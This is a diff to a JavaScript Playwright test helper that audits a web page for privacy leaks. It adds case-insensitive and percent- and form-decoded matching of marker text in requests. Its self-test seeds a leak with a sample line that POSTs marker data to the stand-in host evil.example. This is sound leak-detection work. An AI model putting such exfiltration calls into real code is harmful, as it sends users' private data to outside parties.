@@ -9,7 +9,7 @@
 //   const { requests, origins } = await audit.assertClean(); // throws one Error listing every finding
 //
 // It lives under e2e/helpers/, so the runner (which only runs top-level *.e2e.mjs) never runs it as a script.
-// Self-test (proves each of the 12 checks fires on a seeded leak and stays quiet on a clean page):
+// Self-test (proves each of the 14 checks fires on a seeded leak and stays quiet on a clean page):
 //   node web/e2e/helpers/privacy-audit.mjs --self-test
 import http from "node:http";
 
@@ -31,6 +31,8 @@ export const AUDIT_TAGS = [
   "network-origin",
   "post-target",
   "marker-request",
+  "marker-request-encoded",
+  "marker-request-form",
   "marker-console",
   "marker-pageerror",
   "marker-body",
@@ -41,6 +43,17 @@ export const AUDIT_TAGS = [
   "failed-request",
   "websocket-host",
 ];
+
+/** Percent-decode every run of %XX that is valid UTF-8 and leave anything malformed as it was. Never throws. */
+function lenientDecode(s) {
+  return s.replace(/(?:%[0-9a-f]{2})+/gi, (run) => {
+    try {
+      return decodeURIComponent(run);
+    } catch {
+      return run;
+    }
+  });
+}
 
 const short = (s, n = 160) => (s.length > n ? s.slice(0, n) + "..." : s);
 
@@ -68,7 +81,29 @@ export function createPrivacyAudit({ baseUrl, rpcUrl, markers, extraAllowedOrigi
   const snapshots = []; // { label, text }
   const pages = []; // { page, label, bodyText }
 
-  const hit = (text) => markers.filter((m) => text.includes(m));
+  // Case-insensitive: a marker typed in another case is still the bill's text.
+  const hit = (text) => {
+    const t = text.toLowerCase();
+    return markers.filter((m) => t.includes(m.toLowerCase()));
+  };
+
+  // Request URLs are reported percent-encoded ("SHREE%20GANESH") and form bodies use "+" for a space
+  // ("SHREE+GANESH"), so the plain text never contains the marker. Look at the decoded views as well and name
+  // the view that matched: raw is "marker-request", percent-decoded "marker-request-encoded", form-decoded
+  // (+ as space, then percent-decoded) "marker-request-form". Each marker is reported once, by its plainest view.
+  const hitRequest = (text) => {
+    const raw = text.toLowerCase();
+    const pct = lenientDecode(text).toLowerCase();
+    const form = lenientDecode(text.replace(/\+/g, " ")).toLowerCase();
+    const out = [];
+    for (const m of markers) {
+      const k = m.toLowerCase();
+      if (raw.includes(k)) out.push({ m, tag: "marker-request" });
+      else if (pct.includes(k)) out.push({ m, tag: "marker-request-encoded" });
+      else if (form.includes(k)) out.push({ m, tag: "marker-request-form" });
+    }
+    return out;
+  };
 
   // Async: it installs a WebSocket recorder before the first navigation, so `await` it right after the page is
   // created. Playwright's own "websocket" event only fires for sockets that reached a handshake, so a socket to
@@ -153,7 +188,8 @@ export function createPrivacyAudit({ baseUrl, rpcUrl, markers, extraAllowedOrigi
             } catch {
               text = String(rows);
             }
-            for (const m of ms) if (text.includes(m)) hits.push(name + "/" + store + ":" + m);
+            const lower = text.toLowerCase();
+            for (const m of ms) if (lower.includes(m.toLowerCase())) hits.push(name + "/" + store + ":" + m);
           }
           db.close();
         }
@@ -184,8 +220,10 @@ export function createPrivacyAudit({ baseUrl, rpcUrl, markers, extraAllowedOrigi
         add("post-target", `${r.label}: POST ${r.url}`);
       }
     }
-    // 3: markers in any request URL or body.
-    for (const r of requests) for (const m of hit(r.url + " " + r.post)) add("marker-request", `${r.label}: "${m}" in ${r.method} ${r.url}`);
+    // 3: markers in any request URL or body, as sent, percent-decoded, or form-decoded.
+    for (const r of requests) {
+      for (const { m, tag } of hitRequest(r.url + " " + r.post)) add(tag, `${r.label}: "${m}" in ${r.method} ${r.url}`);
+    }
     // 4 and 5: markers in console lines and page errors.
     for (const c of consoleLines) for (const m of hit(c.text)) add("marker-console", `${c.label}: "${m}"`);
     for (const e of pageErrors) for (const m of hit(e.text)) add("marker-pageerror", `${e.label}: "${m}"`);
@@ -304,6 +342,12 @@ async function selfTest() {
         const M = "SHREE GANESH";
         fetch("https://evil.example/c", { method: "POST", body: M }).catch(() => {}); // network-origin, post-target, marker-request
         fetch("https://api.web3modal.org/x", { method: "POST", body: "x" }).catch(() => {}); // a tolerated host, the wrong method
+        fetch("/x?v=" + encodeURIComponent(M.toLowerCase())).catch(() => {}); // marker-request-encoded (percent-encoded, other case)
+        fetch("/x", {
+          method: "POST",
+          headers: { "content-type": "application/x-www-form-urlencoded" },
+          body: new URLSearchParams({ vendor: M }).toString(), // "vendor=SHREE+GANESH"
+        }).catch(() => {}); // marker-request-form
         console.log(M); // marker-console
         setTimeout(() => {
           throw new Error(M);
@@ -338,6 +382,24 @@ async function selfTest() {
       if (!message) throw new Error("the dirty page was not flagged");
       const missing = AUDIT_TAGS.filter((t) => !message.includes(`[${t}]`));
       if (missing.length > 0) throw new Error("these checks never fired: " + missing.join(", "));
+      await context.close();
+    }
+    // (c) A malformed percent sequence in a request must not break the audit, and an ordinary one stays quiet.
+    {
+      const context = await newContext();
+      const audit = createPrivacyAudit({ baseUrl, rpcUrl, markers: ["SHREE GANESH"] });
+      const page = await context.newPage();
+      await audit.track(page, "malformed", { bodyText: true });
+      await page.goto(baseUrl + "/");
+      await page.evaluate(() => {
+        fetch("/x?q=100%&r=%E0%A4%A&s=%zz").catch(() => {});
+      });
+      await page.waitForTimeout(300);
+      try {
+        await audit.assertClean();
+      } catch (err) {
+        throw new Error("a malformed percent sequence was flagged or threw: " + (err instanceof Error ? err.message : String(err)));
+      }
       await context.close();
     }
     console.log(`AUDIT SELF-TEST OK tags=${AUDIT_TAGS.length}`);
